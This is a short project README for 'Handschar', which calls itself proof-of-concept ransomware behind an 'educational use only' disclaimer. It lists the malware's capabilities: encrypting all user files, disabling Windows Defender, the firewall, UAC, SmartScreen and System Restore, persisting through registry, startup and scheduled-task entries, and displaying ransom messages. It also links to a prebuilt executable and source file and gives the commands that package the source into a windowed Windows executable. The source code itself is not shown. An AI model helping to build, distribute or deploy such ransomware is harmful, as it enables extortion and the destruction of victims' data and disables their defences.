# 🔒 Handschar Ransomware

![Banner](https://via.placeholder.com/1200x400/1a1a1a/ff0000?text=HANDSCHAR+RANSOMWARE)

> **⚠️ EDUCATIONAL USE ONLY** – Do not run on real systems.

---

## 📌 Overview

Handschar is a proof‑of‑concept ransomware that demonstrates:

- AES‑256 encryption of all user files (documents, images, videos, archives)
- Disables Windows Defender, Firewall, UAC, SmartScreen, System Restore
- Permanent persistence (Run registry, Startup folder, Scheduled Tasks)
- Changes wallpaper and icons to ransom messages
- Real‑time GUI showing encrypted file count

---

## 📥 Download

- **Latest EXE:** [Handschar.exe](https://github.com/yourusername/Handschar/releases/download/v1.0/Handschar.exe)
- **Source:** [Handschar2.py](Handschar2.py)

---

## 🔧 Build from Source

```bash
pip install pycryptodome pillow pywin32 pyinstaller
pyinstaller --onefile --windowed --name=Handschar Handschar2.py
